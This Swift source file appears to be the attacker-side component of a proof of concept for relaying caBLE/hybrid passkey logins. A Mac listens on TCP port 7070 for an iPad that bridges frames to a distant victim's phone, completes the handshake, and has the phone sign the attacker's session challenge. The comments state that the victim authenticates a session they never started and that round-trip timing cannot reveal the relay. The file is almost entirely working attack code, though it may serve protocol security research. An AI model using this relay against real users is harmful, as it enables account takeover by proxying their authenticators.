//
//  main.swift
//  cable-relay-poc — RELAY-BROWSER role (runs on the Mac)
//
//  A command-line Swift tool. The Mac has NO Bluetooth role here. It:
//    1. Listens on TCP :7070 for the iPad collector.
//    2. Runs the HONEST initiator side of the handshake + assertion,
//       driving frames down the TCP bridge. The iPad relays them to the
//       phone over L2CAP and relays replies back.
//    3. On success, prints: a shared session key agreed with a phone it
//       has never seen on a radio, a valid assertion signature, and the
//       app-layer RTT — which is far too coarse to reveal the relay.
//
//  Build:  swiftc -O main.swift ../Shared/Protocol.swift ../Shared/NoiseBox.swift -o relaybrowser
//  Run:    ./relaybrowser
//
//  This file is the "attacker's laptop" that completes a login the victim
//  never initiated. Everything it does is cryptographically legitimate.
//

import Foundation
import Network

final class RelayBrowser {
    private var listener: NWListener!
    private var conn: NWConnection?
    private var rxBuffer = Data()

    private let identity = Identity()
    private let noise: NoiseBox
    private var probeSentAt: UInt64 = 0
    private let challenge = Data("session-\(UUID().uuidString)".utf8)  // caBLE: clientDataHash

    init() { noise = NoiseBox(role: .initiator, staticKey: identity) }

    func run() {
        let params = NWParameters.tcp
        listener = try! NWListener(using: params, on: 7070)
        listener.newConnectionHandler = { [weak self] c in self?.accept(c) }
        listener.start(queue: .main)
        print("[MAC] relay-browser listening on :7070 — waiting for iPad collector")
        RunLoop.main.run()
    }

    private func accept(_ c: NWConnection) {
        conn = c
        c.stateUpdateHandler = { [weak self] st in
            if case .ready = st {
                print("[MAC] collector connected; starting ceremony across the relay")
                self?.receive()
                self?.startHandshake()
            }
        }
        c.start(queue: .main)
    }

    private func send(_ msg: Message) {
        conn?.send(content: Frame.encode(msg.encoded()), completion: .contentProcessed { _ in })
    }

    private func receive() {
        conn?.receive(minimumIncompleteLength: 1, maximumLength: 65536) { [weak self] data, _, done, err in
            guard let self else { return }
            if let d = data, !d.isEmpty {
                self.rxBuffer.append(d)
                for frame in Frame.drain(&self.rxBuffer) { self.handle(frame) }
            }
            if done || err != nil { print("[MAC] bridge closed"); return }
            self.receive()
        }
    }

    private func startHandshake() {
        let m1 = noise.makeInit()
        send(Message(type: .handshakeInit, body: m1))
        print("[MAC] -> handshakeInit (over relay)")
    }

    private func handle(_ frame: Data) {
        guard let msg = Message.decode(frame) else { return }
        switch msg.type {

        case .handshakeResp:
            print("[MAC] <- handshakeResp")
            let m3 = try! noise.makeFinal(consuming: msg.body ?? Data())
            send(Message(type: .handshakeFinal, body: m3))
            print("[MAC] -> handshakeFinal; session key AGREED with a phone seen only via relay")
            if let k = noise.sessionKey {
                let hex = k.withUnsafeBytes { $0.map { String(format: "%02x", $0) }.joined() }
                print("[MAC] session key = \(hex.prefix(32))… (shared, end-to-end, through the relay)")
            }
            // Fire the proximity probe to demonstrate the RTT is useless.
            probeSentAt = nowMicros()
            send(Message(type: .proximityProbe, probeNonce: 1, tMicros: probeSentAt))
            // And request the assertion — the actual "login".
            let sealed = try! noise.seal(challenge)
            send(Message(type: .assertionRequest, body: sealed))
            print("[MAC] -> assertionRequest (asking victim's phone to sign MY session)")

        case .proximityEcho:
            let rttMicros = nowMicros() - probeSentAt
            print(String(format: "[MAC] app-layer RTT = %.1f ms — cannot distinguish 1m from a cross-country relay", Double(rttMicros)/1000.0))

        case .assertionResponse:
            guard let sealed = msg.body, let sig = try? noise.open(sealed) else {
                print("[MAC] assertion open failed"); return
            }
            let ok = verify(sig, over: challenge)
            print("[MAC] <- assertionResponse; signature valid = \(ok)")
            print("[MAC] ===== RELAY COMPLETE: victim authenticated a session they never initiated =====")

        default: break
        }
    }

    private func verify(_ blob: Data, over challenge: Data) -> Bool {
        guard blob.count == 96,
              let pub = try? Curve25519.Signing.PublicKey(rawRepresentation: blob.prefix(32))
        else { return false }
        let sig = blob.dropFirst(32)
        return pub.isValidSignature(sig, for: challenge)
    }
}

import CryptoKit
RelayBrowser().run()
